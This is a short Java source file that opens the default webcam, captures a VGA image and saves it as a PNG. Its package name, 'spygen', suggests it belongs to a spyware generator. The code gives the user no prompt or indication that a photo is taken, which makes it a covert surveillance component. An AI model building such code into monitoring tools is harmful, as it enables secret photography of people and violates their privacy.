package com.houarizegai.spygen.webcam;

import com.github.sarxos.webcam.Webcam;
import com.github.sarxos.webcam.WebcamResolution;
import com.houarizegai.spygen.global.Settings;

import javax.imageio.ImageIO;
import java.io.File;
import java.io.IOException;

public class Camera {

    public static void takePicture(String name) {
        Webcam webcam = Webcam.getDefault(); // Get default camera
        if(webcam == null) // Can't find camera
            return;

        webcam.close();
        webcam.setViewSize(WebcamResolution.VGA.getSize());
        webcam.open(); // Open the camera
        try { // save the picture captured
            ImageIO.write(webcam.getImage(), "PNG", new File(Settings.WEBCAM_PATH + name + ".png"));
        } catch (IOException ioe) {
            ioe.printStackTrace();
        }
        webcam.close(); // Close the camera

    }
}
